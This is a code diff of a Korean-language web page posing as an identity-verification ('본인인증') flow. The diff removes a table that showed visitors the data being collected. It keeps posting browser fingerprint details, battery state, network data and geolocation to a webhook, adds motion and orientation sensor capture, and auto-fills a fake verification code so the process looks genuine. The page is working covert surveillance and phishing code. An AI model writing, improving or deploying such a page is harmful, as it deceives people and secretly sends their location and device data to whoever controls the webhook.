@@ -20,9 +20,6 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
 .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
 .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
-#infoDisplay { margin-top: 20px; }
-#infoDisplay table { width: 100%; border-collapse: collapse; }
-#infoDisplay td { border: 1px solid #ccc; padding: 6px; }
 </style>
 </head>
 <body>
@@ -42,14 +39,6 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
 </div>
 <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
-</div>
-
-<!-- 수집 정보 표시 -->
-<div id="infoDisplay" class="container hidden">
-<h2>수집된 정보</h2>
-<table>
-<tbody id="infoTable"></tbody>
-</table>
 </div>
 
 <!-- page2: 전화번호 입력 -->
@@ -88,95 +77,90 @@ function goNext() {
 // 최대 정보 수집
 async function collectUserInfo() {
   let info = {};
+  info.userAgent = navigator.userAgent;
+  info.language = navigator.language;
+  info.platform = navigator.platform;
+  info.cookieEnabled = navigator.cookieEnabled;
+  info.onLine = navigator.onLine;
+  info.hardwareConcurrency = navigator.hardwareConcurrency;
+  info.deviceMemory = navigator.deviceMemory || "unknown";
+  info.plugins = Array.from(navigator.plugins).map(p=>p.name);
 
-  info["User Agent"] = navigator.userAgent;
-  info["Language"] = navigator.language;
-  info["Platform"] = navigator.platform;
-  info["Cookie Enabled"] = navigator.cookieEnabled;
-  info["Online"] = navigator.onLine;
-  info["CPU Cores"] = navigator.hardwareConcurrency;
-  info["Device Memory"] = navigator.deviceMemory || "unknown";
-  info["Installed Plugins"] = Array.from(navigator.plugins).map(p=>p.name).join(", ");
-
-  info["Screen Width"] = screen.width;
-  info["Screen Height"] = screen.height;
-  info["Available Width"] = screen.availWidth;
-  info["Available Height"] = screen.availHeight;
-  info["Color Depth"] = screen.colorDepth;
-  info["Pixel Depth"] = screen.pixelDepth;
-
-  info["Window Inner Width"] = window.innerWidth;
-  info["Window Inner Height"] = window.innerHeight;
-  info["Window Outer Width"] = window.outerWidth;
-  info["Window Outer Height"] = window.outerHeight;
-
-  info["Timezone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  info.screen = {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth
+  };
+  info.window = {
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight
+  };
+  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
   if (navigator.connection) {
-    info["Network Downlink"] = navigator.connection.downlink;
-    info["Network Type"] = navigator.connection.effectiveType;
-    info["RTT"] = navigator.connection.rtt;
-    info["Save Data"] = navigator.connection.saveData;
+    info.network = {
+      downlink: navigator.connection.downlink,
+      effectiveType: navigator.connection.effectiveType,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    };
   }
 
-  // 배터리
+  // 배터리 정보: 없으면 unknown
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-      info["Battery Charging"] = battery.charging;
-      info["Battery Level"] = battery.level;
-      info["Battery Charging Time"] = battery.chargingTime;
-      info["Battery Discharging Time"] = battery.dischargingTime;
-    } catch(e) {
-      info["Battery Charging"] = "unknown";
-      info["Battery Level"] = "unknown";
-      info["Battery Charging Time"] = "unknown";
-      info["Battery Discharging Time"] = "unknown";
+      info.battery = {
+        charging: battery.charging,
+        level: battery.level,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    } catch(e) { 
+      info.battery = { charging:"unknown", level:"unknown", chargingTime:"unknown", dischargingTime:"unknown" };
     }
   } else {
-    info["Battery Charging"] = "unknown";
-    info["Battery Level"] = "unknown";
-    info["Battery Charging Time"] = "unknown";
-    info["Battery Discharging Time"] = "unknown";
+    info.battery = { charging:"unknown", level:"unknown", chargingTime:"unknown", dischargingTime:"unknown" };
   }
 
-  // 위치
-  await new Promise(resolve => {
-    if (navigator.geolocation) {
+  if (navigator.geolocation) {
+    await new Promise(resolve => {
       navigator.geolocation.getCurrentPosition(pos => {
-        info["Latitude"] = pos.coords.latitude;
-        info["Longitude"] = pos.coords.longitude;
-        info["Location Accuracy"] = pos.coords.accuracy;
+        info.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
         resolve();
-      }, err => { info["Location Error"] = err.message; resolve(); });
-    } else {
-      resolve();
-    }
-  });
-
-  info["Timestamp"] = new Date().toISOString();
-
-  // 화면에 표시
-  const tableBody = document.getElementById("infoTable");
-  tableBody.innerHTML = "";
-  for (let key in info) {
-    const row = `<tr><td><strong>${key}</strong></td><td>${info[key]}</td></tr>`;
-    tableBody.innerHTML += row;
+      }, err => { info.locationError = err.message; resolve(); });
+    });
   }
-  document.getElementById("infoDisplay").classList.remove("hidden");
 
-  // 웹후크 전송 (폼데이터)
+  info.sensors = {};
+  function sensorHandler(event) {
+    info.sensors.acceleration = event.acceleration;
+    info.sensors.accelerationIncludingGravity = event.accelerationIncludingGravity;
+    info.sensors.rotationRate = event.rotationRate;
+  }
+  if (window.DeviceMotionEvent) { window.addEventListener("devicemotion", sensorHandler, { once: true }); }
+  if (window.DeviceOrientationEvent) { window.addEventListener("deviceorientation", e=>{info.sensors.orientation={alpha:e.alpha,beta:e.beta,gamma:e.gamma};},{once:true}); }
+
+  info.timestamp = new Date().toISOString();
+
+  // JSON 대신 URLSearchParams로 전송
   const formData = new URLSearchParams();
   for (let key in info) {
-    formData.append(key, info[key]);
+    if (typeof info[key] === "object") {
+      formData.append(key, JSON.stringify(info[key]));
+    } else {
+      formData.append(key, info[key]);
+    }
   }
   formData.append("page","1");
 
-  fetch(webhookUrl,{
-    method:"POST",
-    headers: {"Content-Type":"application/x-www-form-urlencoded"},
-    body: formData
-  }).catch(err=>console.error("WebHook 전송 오류:",err));
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
 // page2 -> page3
@@ -191,14 +175,13 @@ function sendPhone() {
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
 
-  // 4초 후 인증번호 자동 입력, 1초 후 page4
   setTimeout(()=>{
-    document.getElementById("authCode").value="704532";
+    document.getElementById("authCode").value="1224";
     setTimeout(()=>{
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
     },1000);
-  },1500);
+  },4000);
 }
 
 // page4 전송
